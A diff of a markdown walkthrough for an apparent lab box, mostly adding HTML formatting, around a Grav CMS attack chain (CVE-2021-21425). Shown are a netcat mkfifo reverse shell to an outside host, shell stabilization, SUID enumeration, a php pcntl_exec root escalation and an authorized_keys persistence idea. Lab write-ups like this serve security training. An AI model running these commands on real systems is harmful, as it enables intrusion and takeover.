@@ -35,18 +35,21 @@ Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
 ```
-
+<br>
 
 > Enumerating the website, we in fact find that there is a content management system in use, Grav-CMS.
-
+<br>
+<p align="center">
 
 ![image](https://github.com/user-attachments/assets/0d45e3e0-b7ae-4582-9fb7-573951440855)
-
+</p>
+<br>
+<p align="center">
 
 ![image](https://github.com/user-attachments/assets/cc0904c2-185e-4a2b-a47d-6564ca5e889b)
+</p>
 
-
-A quick search for related exploits turns up an interesting find. 
+> A quick search for related exploits turns up an interesting find. 
 
 
 ### GravCMS Unauthenticated Arbitrary YAML Write/Update leads to Code Execution (CVE-2021-21425)
@@ -127,13 +130,14 @@ print("Exploit completed")
 ```
 python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.21.153 4444 >/tmp/f' -t http://192.168.207.12/grav-admin
 ```
-
+<br>
 
 > We get a reverse shell, as www-data.
-
+<br>
+<p align="center">
 
 ![image](https://github.com/user-attachments/assets/14e3bca3-8656-4e09-b26a-48b350817cb6)
-
+</p>
 
 ### Stabilize Shell
 ------
@@ -141,10 +145,10 @@ python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.
 ```
 export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-
+<p align="center">
 
 ![image](https://github.com/user-attachments/assets/bb1e2a10-7faf-40fb-abd8-7ddfbf7a2f10)
-
+</p>
 
 > We cannot check for sudo rights on www-data because we don't have the password. But we can search for binaries that may have the SUID bit set.
 
@@ -155,9 +159,9 @@ export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -u=s 2>/dev/null
 ```
 <br>
-
+<p align="center">
 ![image](https://github.com/user-attachments/assets/71cc304e-6c4b-4679-88a9-609b05ad1bba)
-
+</p>
 
 > Checking out the findings on GTFOBins php seems to be a great candidate for Privilege Escalation.
 
@@ -168,10 +172,10 @@ find / -perm -u=s 2>/dev/null
 ```shell
 /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
-
+<p align="center">
 
 ![image](https://github.com/user-attachments/assets/4bcce87e-17d0-4de1-9c29-1a4e3eed8e1a)
-
+</p>
 
 > Now that we have root access, we can submit the proof of pwnage. Additionally we can have persistence on the machine by adding our public key to the authorized_keys file, though that is unnecessary.
 
